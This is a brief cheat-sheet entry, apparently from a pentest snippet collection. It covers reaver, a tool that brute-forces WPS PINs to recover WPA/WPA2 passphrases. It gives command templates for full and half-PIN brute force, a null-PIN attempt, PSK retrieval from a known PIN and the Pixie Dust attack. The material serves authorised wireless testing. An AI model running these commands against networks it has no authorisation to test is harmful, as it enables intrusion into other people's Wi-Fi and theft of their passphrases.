# reaver
% wifi, reaver, wps
#plateform/linux #target/remote #cat/RECON #cat/ATTACK

## _desc
```
```

## _repo
```
https://github.com/t6x/reaver-wps-fork-t6x
```

## _doc
```
Reaver implements a brute force attack against Wifi Protected Setup (WPS) registrar PINs in order to recover WPA/WPA2 passphrases
```

## _install
```
```

## PIN brute force
```bash
sudo reaver -v -b <bssid> -c <wlan_channel> -i <wlan_mon_interface|wmon>
```


## PIN brute force (half PIN)
```bash
sudo reaver -v -b <bssid> -c <wlan_channel> -i <wlan_mon_interface|wmon> -p <half_pin>
```

## Null PIN
```bash
sudo reaver -v -b <bssid> -c <wlan_channel> -i <wlan_mon_interface|wmon> -p " "
```

## retrive PSK from PIN
```bash
sudo reaver -v -i <wlan_mon_interface|wmon> -b <bssid> -p <pin>
```

## Pixie Dust attack
```bash
reaver -K 1 -vvv -b <bssid> -c <wlan_channel> -i <wlan_mon_interface|wmon>
```
